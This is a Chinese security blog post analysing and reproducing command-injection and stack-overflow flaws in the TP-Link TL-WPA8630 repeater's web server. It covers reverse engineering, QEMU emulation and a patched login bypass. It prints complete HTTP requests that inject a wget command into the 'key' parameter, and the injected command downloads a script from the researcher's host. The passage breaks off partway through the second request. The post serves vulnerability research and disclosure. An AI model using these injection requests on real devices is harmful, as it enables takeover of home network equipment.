---
title: TPLink 中继器设备命令注入漏洞分析及复现
url: https://www.secpulse.com/archives/197163.html
source: 安全脉搏
date: 2023-03-08
fetch_date: 2025-10-04T08:52:32.601914
---

# TPLink 中继器设备命令注入漏洞分析及复现

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# TPLink 中继器设备命令注入漏洞分析及复现

[IOT安全](https://www.secpulse.com/archives/category/iot-security)

[ChaMd5安全团队](https://www.secpulse.com/newpage/author?author_id=3747)
![]( https://www.secpulse.com/wp-content/themes/secpulse2017/img/renzheng0.png)

2023-03-07

18,779

写在前面：

在分析TPlink中继器设备时（这里以TL-WPA8630为代表），发现了两处可以利用的命令注入和栈溢出漏洞，因此借这个机会，将TPlink此类设备的模拟方法也进行了研究，并在本地对漏洞进行了复现。相关漏洞已经提交至CVE官网。

漏洞介绍：
在httpd文件处理admin/powerline的sub\_40A918函数中，存在两处命令注入漏洞（也可以构造栈溢出）。对plc\_device对应的key参数、plc\_add对应的devicePwd参数不加过滤，直接vsprintf拼接执行，造成命令注入，也可以实现栈溢出攻击。
版本：TL-WPA8630 KIT(US)\_V2\_171011版，以及其他WPA、WR、WA等电力猫与中继器设备对应版本。

**漏洞静态分析**
httpd文件调用sub\_40A918处理/admin/powerline的对应请求：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-1678176349.png)

sub\_40A918首先判断form参数，如果form参数是plc\_device，则交给sub\_40A774函数处理，如果form参数是plc\_add，则交给sub\_40A80C函数处理，这两个函数都有漏洞，我们依次分析。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-16781763491.png)

sub\_40A774函数如下，获取operation参数，如果参数是remove，则获取后续key参数，然后将key交给sub\_4036A0函数处理，后续会将key的参数直接用vsprintf凭借，然后执行，既可以实现命令注入，又可以实现栈溢出。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-1678176350.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-1678176352.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-16781763521.png)

sub\_40A80C函数如下，获取operation参数，如果参数是write，则获取后续devicePwd参数，然后将其交给sub\_4036A0函数处理，同上述一样，既可以实现命令注入，又可以实现栈溢出。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-1678176353.png)

**固件模拟**
基本步骤和往常的设备模拟一样，利用qemu进行系统模拟，命令如下：

```
#qemu系统模式启动
sudo qemu-system-mips -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mips_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic -net tap -nographic
#主机网卡配置
#! /bin/sh
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -F
sudo iptables -X
sudo iptables -t nat -F
sudo iptables -t nat -X
sudo iptables -t mangle -F
sudo iptables -t mangle -X
sudo iptables -P INPUT ACCEPT
sudo iptables -P FORWARD ACCEPT
sudo iptables -P OUTPUT ACCEPT
sudo iptables -t nat -A POSTROUTING -o ens33 -j MASQUERADE
sudo iptables -I FORWARD 1 -i tap0 -j ACCEPT
sudo iptables -I FORWARD 1 -o tap0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo ifconfig tap0 192.168.100.254 netmask 255.255.255.0
#qemu网卡配置
#！/bin/sh
ifconfig eth0 192.168.100.2 netmask 255.255.255.0
route add default gw 192.168.100.254
#文件系统上传
scp -r squashfs-root/ root@192.168.100.2:~/
#挂载执行：
mount -o bind /dev ./squashfs-root/dev
mount -t proc /proc ./squashfs-root/proc
chroot squashfs-root sh
```

在完成基本环境搭建后，下面还是最困难的问题，启动设备的web服务，直接启动httpd文件：

```
./usr/bin/httpd
```

发现没有任何报错，然后我们访问对应对应IP：http://192.168.100.2/index.html， 居然直接成功访问登录界面：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-1678176354.png)

心里非常惊喜，以为模拟成功，结果发现并没有。输入TPLink的初始用户名和密码：admin、admin，结果提示，用户名和密码错误。按理来说，此设备的默认密码就是admin，但是发生了错误，说明问题出现在登录时的密码验证环节。我们用burpsuite抓一下登陆时的数据包，发现设备会将输入的用户名和密码写入Cookie的Authorization字段。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-1678176355.png)

我们在IDA里逆向对应的处理流程，程序会先读取Authorization字段，然后在sub\_4269B4函数中进行了处理，并进行了分支跳转。盲猜sub\_4269B4函数功能就是对登录字段进行校验。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-16781763551.png)

分析sub\_4269B4函数，发现该函数确实在进行授权校验，主要原理就是将Authorization字段，同config文件夹下的account.config配置文件中的对应结果进行匹配，匹配失败则返回-1。由于我们直接对解包后的文件系统进行模拟的缘故，config文件夹下并没有相关配置文件，因此登录时会验证失败。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-1678176356.png)

因此，我们要么构造一个符合TPlink结构的config配置文件，要么直接对登录流程进行patch，我们当然选择比较简单的patch方法，只需要将登录的验证跳转分支修改即可。我们将sub\_4269B4函数判断改为-1登陆成功，也就是将bltz指令改为bgez指令即可。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-1678176357.png)

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-1678176358.png)

将新的httpd文件上传至qemu，此时输入admin、admin，即可成功登入主界面（其实此时应该是任意用户名和密码都可以登入了）：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-1678176359.png)

**漏洞动态复现**
我们分别对两个漏洞点进行复现，在这里我们采用wget命令，验证能否下载文件来证明命令注入成功，在ubuntu中用python搭建简易的web服务器：

```
python3 -m http.server
```

首先是plc\_device对应的漏洞，发送数据包如下：

```
POST /admin/powerline HTTP/1.1
Host: 192.168.100.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 63
Origin: http://192.168.100.2
Connection: close
Referer: http://192.168.100.2/
Cookie: Authorization=Basic%20admin%3A21232f297a57a5a743894a0e4a801fc3

xxxxxxxxxxxxxxxxxxxxxxxxxx;wget http://192.168.100.254:8000/net.sh;

#不过实际抓包时，发现form参数是跟在POST的URL后面传的，不过两种传参都可以
POST /admin/powerline?form=plc_device HTTP/1.1
```

成功实现对恶意文件net.sh的下载：

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-197163-1678176360.png)

其次是plc\_add对应的漏洞，发送数据包如下：

```
POST /admin/powerline HTTP/1.1
Host: 192.168.100.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:92.0) Gecko/20100101 Firefox/92.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 68
Origin: http://192.168.100.2
Connection: close
Refe...